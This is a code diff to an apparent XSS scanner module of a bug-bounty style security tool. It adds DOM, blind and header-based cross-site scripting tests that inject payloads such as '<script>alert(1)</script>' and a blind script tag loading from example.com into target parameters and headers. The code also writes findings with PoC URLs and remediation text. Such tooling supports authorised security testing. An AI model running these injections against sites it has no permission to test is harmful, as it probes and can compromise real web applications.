@@ -13,7 +13,7 @@ import asyncio
 import hashlib
 from typing import List, Dict, Optional, Set, Tuple
 from dataclasses import dataclass, field
-from urllib.parse import urljoin, parse_qs, urlparse, quote
+from urllib.parse import urljoin, parse_qs, urlparse, quote, unquote
 
 from core.base_module import BaseModule, Finding
 
@@ -96,7 +96,7 @@ class XSSTester(BaseModule):
             'script': [
                 XSSPayload('";alert(1);//', 'script', severity='Critical'),
                 XSSPayload("';alert(1);//", 'script', severity='Critical'),
-                XSSPayload('\\';alert(1);//', 'script', severity='Critical'),
+                XSSPayload("\\';alert(1);//", 'script', severity='Critical'),
                 XSSPayload('${alert(1)}', 'script', severity='Critical'),
                 XSSPayload('`alert(1)`', 'script', severity='Critical'),
                 XSSPayload('"+alert(1)+"', 'script', severity='Critical'),
@@ -469,8 +469,12 @@ class XSSTester(BaseModule):
         }
         
         title = f"[{xss_type}] XSS in '{param}' parameter ({context} context)"
-        
-        description = f"""## Cross-Site Scripting (XSS) Vulnerability
+
+        return Finding(
+            module='xss',
+            title=title,
+            severity=severity_map.get(xss_type, payload.severity),
+            description=f"""## Cross-Site Scripting (XSS) Vulnerability
 
 **Type:** {xss_type}
 **Parameter:** `{param}`
@@ -480,3 +484,99 @@ class XSSTester(BaseModule):
 ### Payload
 ```html
 {payload.payload}
+```
+
+### Impact
+An attacker can execute arbitrary JavaScript in victims' browsers, leading to
+session hijacking, credential theft, defacement, or malware distribution.
+
+### WAF Bypass
+{"WAF bypass techniques used: " + ', '.join(payload.waf_bypass) if payload.waf_bypass else "No WAF bypass required"}
+""",
+            evidence={
+                'parameter': param,
+                'payload': payload.payload,
+                'context': context,
+                'xss_type': xss_type,
+                'waf_bypass': payload.waf_bypass,
+            },
+            poc=f"Navigate to: {target}?{param}={quote(payload.payload)}",
+            remediation='Encode all user-supplied output. Implement a strict Content-Security-Policy. Use HTTPOnly and Secure cookie flags.',
+            cvss_score=cvss_map.get(xss_type, 6.1),
+            bounty_score=bounty_map.get(xss_type, 1500),
+            target=target
+        )
+        return finding
+
+    async def _test_dom_xss(self, target: str, params: Dict):
+        """Test for DOM-based XSS"""
+        dom_payloads = self.payloads.get('dom', [])
+        url_params = params.get('url_params', [])
+
+        for param in url_params:
+            for payload_obj in dom_payloads:
+                try:
+                    test_url = f"{target}?{param}={quote(payload_obj.payload)}"
+                    resp = await self._make_request(test_url)
+                    if not resp:
+                        continue
+                    body = await resp.text()
+                    if self._confirm_xss(body, payload_obj.payload, 'dom'):
+                        finding = self._create_finding(target, param, payload_obj, 'dom', 'DOM-based')
+                        self.findings.append(finding)
+                        self.add_finding(finding)
+                        break
+                except Exception as e:
+                    self.logger.debug(f"DOM XSS test error: {e}")
+
+    async def _test_blind_xss(self, target: str, params: Dict):
+        """Test for Blind XSS using a canary marker"""
+        canary = f"RAPTOR-BLIND-{hash(target) % 99999}"
+        blind_payload = XSSPayload(
+            f'<script src="https://example.com/x?c={canary}"></script>',
+            'html', severity='High'
+        )
+        url_params = params.get('url_params', [])
+
+        for param in url_params[:5]:  # limit blind tests
+            try:
+                test_url = f"{target}?{param}={quote(blind_payload.payload)}"
+                await self._make_request(test_url)
+                # Blind XSS can't be confirmed without callback server — report as potential
+                finding = self._create_finding(target, param, blind_payload, 'html', 'Blind')
+                finding.title = f"[Blind/Potential] XSS in '{param}' parameter"
+                finding.description = (
+                    f"Blind XSS payload injected into '{param}'. "
+                    f"Canary: {canary}. Confirm via out-of-band callback."
+                )
+                self.findings.append(finding)
+                self.add_finding(finding)
+            except Exception as e:
+                self.logger.debug(f"Blind XSS error: {e}")
+
+    async def _test_header_xss(self, target: str):
+        """Test XSS via HTTP headers"""
+        injectable_headers = ['User-Agent', 'Referer', 'X-Forwarded-For', 'X-Forwarded-Host']
+        payload_obj = XSSPayload('<script>alert(1)</script>', 'html', severity='Medium')
+
+        for header in injectable_headers:
+            try:
+                resp = await self._make_request(target, headers={header: payload_obj.payload})
+                if not resp:
+                    continue
+                body = await resp.text()
+                if self._confirm_xss(body, payload_obj.payload, 'html'):
+                    finding = self._create_finding(target, header, payload_obj, 'html', 'Header-based')
+                    self.findings.append(finding)
+                    self.add_finding(finding)
+            except Exception as e:
+                self.logger.debug(f"Header XSS error: {e}")
+
+    async def _store_findings(self):
+        """Persist findings to database"""
+        if self.db:
+            for finding in self.findings:
+                try:
+                    self.db.save_finding(finding)
+                except Exception:
+                    pass
